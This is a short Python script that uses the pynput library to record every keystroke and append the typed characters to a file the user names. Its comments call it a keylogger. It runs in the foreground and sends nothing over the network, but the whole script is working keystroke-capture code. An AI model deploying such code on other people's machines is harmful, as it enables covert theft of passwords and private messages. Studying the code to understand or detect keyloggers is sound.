from pynput import keyboard

# Function to write keystrokes to a file
def write_to_file(keys, filepath):
    with open(filepath, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

# Define the keylogger function
def on_press(key):
    try:
        write_to_file([key], filepath)  # Call write_to_file with filepath argument
    except AttributeError:
        print("Special key {0} pressed".format(key))

# Get user input for the file path
filepath = input("Enter the path to save the keylog file: ")

# Setup listener to monitor keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
